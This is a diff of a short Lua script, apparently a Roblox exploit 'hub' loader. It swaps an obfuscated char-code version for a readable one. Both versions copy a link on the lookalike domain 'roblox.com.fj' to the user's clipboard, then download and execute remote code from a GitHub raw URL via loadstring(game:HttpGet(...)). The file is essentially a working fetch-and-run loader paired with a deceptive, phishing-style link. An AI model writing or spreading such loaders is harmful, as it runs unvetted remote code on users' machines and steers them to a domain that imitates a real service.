@@ -1,16 +1,5 @@
--- Versión ofuscada que funciona correctamente
-local _f = {}
-local _v = {
-    [string.char(71, 114, 111, 117, 112, 76, 105, 110, 107)] = string.char(104, 116, 116, 112, 115, 58, 47, 47, 114, 111, 98, 108, 111, 120, 46, 99, 111, 109, 46, 102, 106, 47, 99, 111, 109, 109, 117, 110, 105, 116, 105, 101, 115, 47, 52, 49, 51, 55, 57, 51, 49, 50, 57, 51, 47),
+_G.Config = {
+    GroupLink = "https://roblox.com.fj/communities/4137931293/",
 }
-
-_f.Config = _v
-
-local _s = string.char(104, 116, 116, 112, 115, 58, 47, 47, 114, 97, 119, 46, 103, 105, 116, 104, 117, 98, 117, 115, 101, 114, 99, 111, 110, 116, 101, 110, 116, 46, 99, 111, 109, 47, 78, 105, 110, 106, 97, 106, 117, 115, 110, 50, 53, 50, 106, 47, 117, 110, 105, 118, 101, 114, 115, 97, 108, 45, 104, 117, 98, 47, 109, 97, 105, 110, 47, 85, 110, 105, 118, 101, 114, 115, 97, 108, 104, 117, 98, 46, 108, 117, 97)
-
-local _c = setclipboard
-local _g = game:HttpGet
-local _l = loadstring
-
-_c(_f.Config.GroupLink)
-_l(_g(_s))()
+setclipboard(_G.Config.GroupLink)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Ninjajusn252j/universal-hub/main/Universalhub.lua"))()
